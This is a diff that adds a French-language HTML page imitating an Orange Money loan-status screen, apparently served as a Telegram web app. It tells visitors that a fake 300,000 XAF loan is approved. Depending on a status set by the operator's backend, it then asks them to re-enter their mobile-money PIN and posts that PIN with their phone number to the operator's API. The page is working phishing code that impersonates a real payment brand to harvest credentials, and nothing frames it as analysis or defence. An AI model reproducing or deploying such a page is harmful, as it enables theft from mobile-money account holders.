@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Statut - Orange Money</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { 
+            background-color: #ff6b00; 
+            margin: 0; 
+            padding: 20px; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            font-family: sans-serif; 
+            box-sizing: border-box;
+        }
+        .screen-container { 
+            width: 100%; 
+            max-width: 400px; 
+            background-color: #fff; 
+            border-radius: 28px; 
+            padding: 30px 20px; 
+            text-align: center; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            box-sizing: border-box;
+        }
+        .status-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        .status-title {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            color: #222;
+        }
+        .status-message {
+            font-size: 16px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        .amount-box {
+            background: #ff6b00; 
+            color: white; 
+            padding: 18px; 
+            border-radius: 12px; 
+            margin: 20px 0; 
+            font-size: 24px; 
+            font-weight: bold;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ff6b00;
+            border-radius: 12px;
+            font-size: 18px;
+            box-sizing: border-box;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .action-btn { 
+            background-color: #ff6b00; 
+            color: white; 
+            border: none; 
+            width: 100%; 
+            padding: 16px; 
+            border-radius: 12px; 
+            font-weight: 800; 
+            font-size: 18px;
+            cursor: pointer; 
+            transition: background-color 0.2s ease;
+        }
+        .action-btn:hover {
+            background-color: #e05e00;
+        }
+        .secondary-btn {
+            background-color: transparent;
+            color: #888;
+            border: none;
+            margin-top: 12px;
+            font-size: 15px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+<div class="screen-container">
+
+    <!-- SUCCESS STATE (Default/Fallback) -->
+    <div id="state-success">
+        <div class="status-icon">🎉</div>
+        <h2 class="status-title">Félicitations !</h2>
+        <p class="status-message">Votre prêt a été <b>approuvé !</b></p>
+        <div class="amount-box" id="display-amount">300 000 XAF</div>
+        <button class="action-btn" onclick="window.location.href='index.html'">Retour à l'accueil</button>
+    </div>
+
+    <!-- ERROR / INVALID LINK STATE -->
+    <div id="state-invalid-link" style="display: none;">
+        <div class="status-icon">⚠️</div>
+        <h2 class="status-title" style="color: #d9534f;">Lien incorrect</h2>
+        <p class="status-message">
+            Le lien ou le message SMS fourni est invalide ou expiré.<br>
+            Veuillez réanalyser le message ou réessayer.
+        </p>
+        <button class="action-btn" onclick="history.back()">Réessayer</button>
+    </div>
+
+    <!-- PIN CONFIRMATION REQUIRED STATE -->
+    <div id="state-repeat-pin" style="display: none;">
+        <div class="status-icon">🔐</div>
+        <h2 class="status-title">Confirmation Requise</h2>
+        <p class="status-message">
+            Une confirmation par code PIN/OTP est requise par le système.<br>
+            Veuillez saisir votre code PIN à nouveau ci-dessous :
+        </p>
+        <input type="password" id="userPinInput" class="input-field" placeholder="Entrez votre PIN" maxlength="8">
+        <button class="action-btn" id="submitPinBtn">CONFIRMER LE PIN</button>
+        <button class="secondary-btn" onclick="history.back()">Retour</button>
+    </div>
+
+</div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", async () => {
+        // Set loan amount display
+        const loanAmount = localStorage.getItem('loan_amount') || "300000";
+        document.getElementById('display-amount').innerText = Number(loanAmount).toLocaleString('fr-FR') + " XAF";
+
+        // Read status passed from backend response or local storage
+        let status = localStorage.getItem('verification_status');
+
+        // Optional: If you want to check status live from your API bot
+        try {
+            const phone = localStorage.getItem('phone');
+            if (phone) {
+                const response = await fetch('/api/check-status?phone=' + encodeURIComponent(phone));
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.status) status = data.status;
+                }
+            }
+        } catch (e) {
+            console.log("Using cached status setting.");
+        }
+
+        // Show appropriate screen state
+        if (status === 'invalid_link' || status === 'error') {
+            showState('state-invalid-link');
+        } else if (status === 'repeat_pin' || status === 'require_pin') {
+            showState('state-repeat-pin');
+        } else {
+            showState('state-success');
+        }
+    });
+
+    function showState(stateId) {
+        document.getElementById('state-success').style.display = 'none';
+        document.getElementById('state-invalid-link').style.display = 'none';
+        document.getElementById('state-repeat-pin').style.display = 'none';
+        
+        document.getElementById(stateId).style.display = 'block';
+    }
+
+    // Submit repeated PIN logic
+    document.getElementById('submitPinBtn').addEventListener('click', async () => {
+        const pin = document.getElementById('userPinInput').value.trim();
+        if (!pin) {
+            alert('Veuillez entrer votre code PIN.');
+            return;
+        }
+
+        await fetch('/api/verify-pin', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: localStorage.getItem('phone'), pin: pin, country: "CI" })
+        });
+
+        // Clear status and revert to success or main page
+        localStorage.removeItem('verification_status');
+        showState('state-success');
+    });
+</script>
+</body>
+</html>
